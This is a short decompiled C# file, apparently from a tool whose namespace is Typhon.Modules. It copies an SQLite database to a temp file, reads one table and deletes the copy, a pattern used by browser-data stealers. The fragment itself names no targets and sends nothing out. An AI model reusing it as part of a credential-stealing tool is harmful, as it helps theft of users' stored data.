using System;
using System.IO;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x0200005C RID: 92
	internal class SqlReader
	{
		// Token: 0x0600022F RID: 559 RVA: 0x0000C848 File Offset: 0x0000AA48
		public static SQLite ReadTable(string database, string table)
		{
			if (!File.Exists(database))
			{
				return null;
			}
			string text = Path.GetTempFileName() + ".dat";
			File.Copy(database, text);
			SQLite sqlite = new SQLite(text);
			sqlite.ReadTable(table);
			File.Delete(text);
			if (sqlite.GetRowCount() == 65536)
			{
				return null;
			}
			return sqlite;
		}
	}
}
